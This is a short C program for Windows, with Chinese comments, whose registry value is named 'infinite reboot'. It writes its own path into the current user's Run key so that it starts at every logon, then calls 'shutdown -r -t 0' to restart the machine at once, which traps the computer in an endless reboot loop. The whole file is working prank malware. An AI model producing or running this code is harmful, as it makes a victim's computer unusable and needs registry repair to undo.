#include <stdio.h>
#include <Windows.h> 
int main()
{
	//路径：计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	//打开注册表 
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);

	//自动获取程序路径
	TCHAR szInfo[260];
	GetModuleFileName(NULL, szInfo, 260);

	//往注册表里写入数据
	/*TCHAR szInfo[260] = L"D:\\Tencent\\QQ\\Bin\\QQScLauncher.exe";*/
	RegSetValueEx(hKey,//注册表句柄
		L"无限重启",//注册表键
		0,//保留，必须为0
		REG_SZ,//数据的类型，字符串的类型，SZ
		(BYTE*)szInfo,//写入注册表的信息
		260);//写入注册表的数据大小
	//重启电脑
	system("shutdown -r -t 0");
	/*printf("开机自启动了");
	getchar();*/
	return 0;
}
